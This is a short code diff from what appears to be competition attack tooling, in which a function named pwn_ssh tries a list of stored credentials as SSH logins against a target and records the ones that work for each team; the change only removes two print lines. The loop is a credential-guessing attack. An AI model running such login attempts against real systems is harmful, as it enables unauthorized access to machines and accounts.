@@ -18,10 +18,8 @@ def pwn_ssh(url: str, port: int, team: int) -> Tuple[str, bool, bool]:
     working = 0
     for credential in bag.credentials():
         try:
-            print("Trying credential:", credential)
             ssh.connect(url, port=port, username=credential.username, password=credential)
             credential.mark_works(team)
-            print("Working credential:", credential)
             working += 1
         except:
             continue
